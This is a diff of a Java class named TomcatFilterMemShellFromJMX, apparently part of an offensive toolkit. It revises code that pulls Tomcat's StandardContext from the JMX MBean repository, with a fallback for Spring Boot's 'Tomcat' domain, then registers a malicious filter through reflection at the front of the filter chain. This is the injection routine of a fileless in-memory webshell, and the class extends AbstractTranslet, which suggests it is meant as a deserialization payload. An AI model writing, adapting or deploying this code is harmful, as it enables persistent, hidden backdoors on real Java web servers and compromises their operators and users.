@@ -48,64 +48,63 @@ public class TomcatFilterMemShellFromJMX extends AbstractTranslet implements Fil
             Repository repository = (Repository) field.get(obj);
 
             Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
-            Iterator<NamedObject> iterator = objectSet.iterator();
-            while (iterator.hasNext()) {
-                try {
-                    DynamicMBean dynamicMBean = iterator.next().getObject();
-                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
-                    field.setAccessible(true);
-                    obj = field.get(dynamicMBean);
+            if (objectSet.size() == 0) {
+                // springboot的jmx中为Tomcat而非Catalina
+                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            }
+            for (NamedObject namedObject : objectSet) {
+                DynamicMBean dynamicMBean = namedObject.getObject();
+                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
+                field.setAccessible(true);
+                obj = field.get(dynamicMBean);
 
-                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
-                    field.setAccessible(true);
-                    StandardContext standardContext = (StandardContext) field.get(obj);
+                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
+                field.setAccessible(true);
+                StandardContext standardContext = (StandardContext) field.get(obj);
 
-                    field = standardContext.getClass().getDeclaredField("filterConfigs");
-                    field.setAccessible(true);
-                    HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
+                field = standardContext.getClass().getDeclaredField("filterConfigs");
+                field.setAccessible(true);
+                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
 
-                    if (map.get(filterName) == null) {
-                        //生成 FilterDef
-                        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
-                        Class filterDefClass = null;
-                        try {
-                            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
-                        } catch (ClassNotFoundException e) {
-                            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
-                        }
-
-                        Object filterDef = filterDefClass.newInstance();
-                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
-                        Filter filter = new TomcatFilterMemShellFromJMX();
-
-                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
-                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
-                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);
-
-                        //设置 FilterMap
-                        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
-                        Class filterMapClass = null;
-                        try {
-                            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
-                        } catch (ClassNotFoundException e) {
-                            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
-                        }
-
-                        Object filterMap = filterMapClass.newInstance();
-                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
-                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
-                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
-                        //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
-                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
-
-                        //设置 FilterConfig
-                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
-                        constructor.setAccessible(true);
-                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
-                        map.put(filterName, filterConfig);
+                if (map.get(filterName) == null) {
+                    //生成 FilterDef
+                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
+                    Class filterDefClass = null;
+                    try {
+                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
+                    } catch (ClassNotFoundException e) {
+                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                     }
-                } catch (Exception e) {
-                    //pass
+
+                    Object filterDef = filterDefClass.newInstance();
+                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
+                    Filter filter = new TomcatFilterMemShellFromJMX();
+
+                    filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
+                    filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
+                    standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);
+
+                    //设置 FilterMap
+                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
+                    Class filterMapClass = null;
+                    try {
+                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
+                    } catch (ClassNotFoundException e) {
+                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+                    }
+
+                    Object filterMap = filterMapClass.newInstance();
+                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
+                    filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
+                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
+                    //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
+                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
+
+                    //设置 FilterConfig
+                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
+                    constructor.setAccessible(true);
+                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
+                    map.put(filterName, filterConfig);
                 }
             }
         } catch (Exception e) {
